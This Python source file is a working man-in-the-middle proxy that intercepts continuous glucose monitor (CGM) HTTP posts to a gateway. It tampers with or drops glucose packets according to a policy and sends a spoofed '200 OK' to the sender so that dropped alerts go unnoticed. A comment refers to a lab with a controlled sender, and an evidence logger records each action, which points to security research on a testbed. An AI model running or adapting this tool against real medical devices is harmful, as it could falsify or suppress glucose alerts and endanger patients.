"""Transparent HTTP proxy for the MITM attack."""

from __future__ import annotations

import json
import logging
import socket
import threading
from typing import Any

from config import AttackerConfig
from evidence_logger import EvidenceLogger
from tamper_policy import TamperPolicy

LOGGER = logging.getLogger(__name__)

_RECV_SIZE = 65536
_FORWARD_TIMEOUT_S = 10


def _build_ok_response() -> bytes:
    """Return a minimal HTTP 200 response for covert dropped packets."""
    body = b'{"status":"ok"}'
    response = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    return response.encode("utf-8") + body


def _parse_content_length(header_lines: list[str]) -> int:
    """Return the parsed Content-Length value, or zero if absent/invalid."""
    for line in header_lines[1:]:
        if ":" not in line:
            continue
        key, _, value = line.partition(":")
        if key.strip().lower() != "content-length":
            continue
        try:
            return int(value.strip())
        except ValueError:
            return 0
    return 0


def _recv_full_http_request(client_sock: socket.socket) -> bytes:
    """Read one full HTTP request using Content-Length."""
    raw = b""

    # No client recv timeout is set because the lab uses a controlled CGM sender and blocking reads keep the proxy logic simple.
    while b"\r\n\r\n" not in raw:
        chunk = client_sock.recv(_RECV_SIZE)
        if not chunk:
            return raw
        raw += chunk

    header_section, _, body = raw.partition(b"\r\n\r\n")
    header_lines = header_section.decode("utf-8", errors="replace").split("\r\n")
    content_length = _parse_content_length(header_lines)
    LOGGER.info(
        "proxy_request_complete content_length=%d body_bytes=%d",
        content_length,
        len(body),
    )

    while len(body) < content_length:
        chunk = client_sock.recv(_RECV_SIZE)
        if not chunk:
            break
        raw += chunk
        _, _, body = raw.partition(b"\r\n\r\n")

    return raw


def _recv_full_http_response(sock: socket.socket) -> bytes:
    """Read one HTTP response using Content-Length when present."""
    response = b""

    while b"\r\n\r\n" not in response:
        chunk = sock.recv(_RECV_SIZE)
        if not chunk:
            LOGGER.info("proxy_response_closed_before_headers bytes=%d", len(response))
            return response
        response += chunk

    header_section, _, body = response.partition(b"\r\n\r\n")
    header_lines = header_section.decode("utf-8", errors="replace").split("\r\n")
    content_length = _parse_content_length(header_lines)

    if content_length > 0:
        while len(body) < content_length:
            chunk = sock.recv(_RECV_SIZE)
            if not chunk:
                break
            response += chunk
            _, _, body = response.partition(b"\r\n\r\n")

    LOGGER.info(
        "proxy_response_complete content_length=%d body_bytes=%d total_bytes=%d",
        content_length,
        len(body),
        len(response),
    )
    return response


def _parse_http_request(
    raw: bytes,
) -> tuple[str, str, dict[str, str], bytes]:
    """Split a raw HTTP request into method, path, headers, and body."""
    try:
        header_section, _, body = raw.partition(b"\r\n\r\n")
        lines = header_section.decode("utf-8", errors="replace").split("\r\n")
        if not lines:
            return "", "", {}, b""

        parts = lines[0].split(" ", 2)
        method = parts[0] if len(parts) > 0 else ""
        path = parts[1] if len(parts) > 1 else ""

        headers: dict[str, str] = {}
        for line in lines[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip().lower()] = v.strip()

        return method, path, headers, body
    except Exception as exc:
        LOGGER.debug("http_parse_error=%s", exc)
        return "", "", {}, b""


def _rebuild_http_request(
    method: str,
    path: str,
    headers: dict[str, str],
    new_body: bytes,
    gateway_host: str,
    gateway_port: int,
) -> bytes:
    """Rebuild an HTTP request with a modified body."""
    updated = dict(headers)
    updated["content-length"] = str(len(new_body))
    updated["host"] = f"{gateway_host}:{gateway_port}"
    updated["connection"] = "close"

    header_lines = [f"{method} {path} HTTP/1.1"]
    for k, v in updated.items():
        header_lines.append(f"{k}: {v}")

    header_block = "\r\n".join(header_lines) + "\r\n\r\n"
    return header_block.encode("utf-8") + new_body


def _forward_to_gateway(
    request_bytes: bytes,
    gateway_ip: str,
    gateway_port: int,
) -> bytes:
    """Send one request to the real gateway and return the response."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(_FORWARD_TIMEOUT_S)
            sock.connect((gateway_ip, gateway_port))
            sock.sendall(request_bytes)
            LOGGER.info(
                "proxy_forward_sent gateway=%s:%d request_bytes=%d",
                gateway_ip,
                gateway_port,
                len(request_bytes),
            )
            response = _recv_full_http_response(sock)
            return response
    except OSError as exc:
        LOGGER.error("forward_error gateway=%s:%d error=%s", gateway_ip, gateway_port, exc)
        return b""


class _ConnectionHandler(threading.Thread):
    """Handle one intercepted client connection."""

    def __init__(
        self,
        client_sock: socket.socket,
        client_addr: tuple,
        config: AttackerConfig,
        policy: TamperPolicy,
        logger: EvidenceLogger,
    ) -> None:
        super().__init__(daemon=True)
        self._client_sock = client_sock
        self._client_addr = client_addr
        self._cfg = config
        self._policy = policy
        self._evidence = logger

    def run(self) -> None:
        """Read one HTTP request, apply tamper policy, and forward."""
        try:
            raw = _recv_full_http_request(self._client_sock)
            if not raw:
                return

            method, path, headers, body = _parse_http_request(raw)

            if method == "POST" and path == self._cfg.gateway_endpoint and body:
                self._handle_glucose_post(method, path, headers, body, raw)
            else:
                # Non-target traffic: forward unchanged without logging
                LOGGER.info(
                    "proxy_forward_mode src=%s path=%s action=forward_unmodified",
                    self._client_addr,
                    path,
                )
                response = _forward_to_gateway(
                    raw, self._cfg.gateway_ip, self._cfg.gateway_port
                )
                if response:
                    self._client_sock.sendall(response)

        except Exception as exc:
            LOGGER.error(
                "connection_handler_error src=%s error=%s", self._client_addr, exc
            )
        finally:
            self._client_sock.close()

    def _handle_glucose_post(
        self,
        method: str,
        path: str,
        headers: dict[str, str],
        body: bytes,
        raw_fallback: bytes,
    ) -> None:
        """Handle one target POST request."""
        try:
            packet: dict[str, Any] = json.loads(body)
        except json.JSONDecodeError as exc:
            LOGGER.warning(
                "json_parse_failed body_len=%d error=%s; forwarding unmodified",
                len(body),
                exc,
            )
            response = _forward_to_gateway(
                raw_fallback, self._cfg.gateway_ip, self._cfg.gateway_port
            )
            if response:
                self._client_sock.sendall(response)
            return

        result = self._policy.evaluate(packet)
        self._evidence.record(
            result=result,
            gateway_ip=self._cfg.gateway_ip,
            gateway_port=self._cfg.gateway_port,
            endpoint=path,
        )

        if result.action == "drop":
            LOGGER.info(
                "proxy drop src=%s alert=%s", self._client_addr, packet.get("alert_level")
            )
            if result.spoof_success_on_drop:
                self._client_sock.sendall(_build_ok_response())
                LOGGER.info(
                    "proxy drop spoofed_success src=%s alert=%s",
                    self._client_addr,
                    packet.get("alert_level"),
                )
            return

        forward_packet = result.modified_packet
        new_body = json.dumps(forward_packet).encode("utf-8")
        request_bytes = _rebuild_http_request(
            method,
            path,
            headers,
            new_body,
            self._cfg.gateway_ip,
            self._cfg.gateway_port,
        )
        LOGGER.info(
            "proxy_forward_mode src=%s path=%s action=%s original_body=%d new_body=%d",
            self._client_addr,
            path,
            result.action,
            len(body),
            len(new_body),
        )

        response = _forward_to_gateway(
            request_bytes, self._cfg.gateway_ip, self._cfg.gateway_port
        )
        if response:
            self._client_sock.sendall(response)


class TransparentProxyAttack:
    """Application-layer proxy for CGM packet tampering."""

    def __init__(
        self,
        config: AttackerConfig,
        policy: TamperPolicy,
        logger: EvidenceLogger,
    ) -> None:
        self._cfg = config
        self._policy = policy
        self._evidence = logger
        self._server_sock: socket.socket | None = None
        self._running = False

    def start(self) -> None:
        """Bind the proxy and start accepting connections."""
        proxy_port = self._cfg.transparent_proxy_port

        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind(("0.0.0.0", proxy_port))
        self._server_sock.listen(10)
        self._running = True

        LOGGER.info(
            "transparent_proxy listening port=%d gateway=%s:%d endpoint=%s",
            proxy_port,
            self._cfg.gateway_ip,
            self._cfg.gateway_port,
            self._cfg.gateway_endpoint,
        )

        try:
            while self._running:
                try:
                    client_sock, client_addr = self._server_sock.accept()
                    handler = _ConnectionHandler(
                        client_sock,
                        client_addr,
                        self._cfg,
                        self._policy,
                        self._evidence,
                    )
                    handler.start()
                except OSError:
                    if self._running:
                        raise
        finally:
            if self._server_sock:
                self._server_sock.close()

    def stop(self) -> None:
        """Signal the proxy to stop accepting new connections."""
        self._running = False
        if self._server_sock:
            try:
                self._server_sock.close()
            except OSError:
                pass
        LOGGER.info("transparent_proxy stopped")
